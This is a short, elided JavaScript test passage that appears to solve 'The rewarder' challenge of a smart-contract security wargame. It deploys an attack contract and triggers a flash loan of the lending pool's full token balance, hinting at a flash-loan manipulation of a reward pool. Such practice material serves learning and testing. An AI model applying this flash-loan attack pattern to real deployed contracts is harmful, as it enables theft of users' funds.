...
describe.only("[Challenge] The rewarder", function () {
  ...
  it("Exploit", async function () {
    const AttackTheRewarderFactory = await ethers.getContractFactory(
      "AttackTheRewarder",
      deployer
    );
    this.attack = await AttackTheRewarderFactory.deploy(
    ...
    await this.attack.flashLoan(TOKENS_IN_LENDER_POOL);
  });
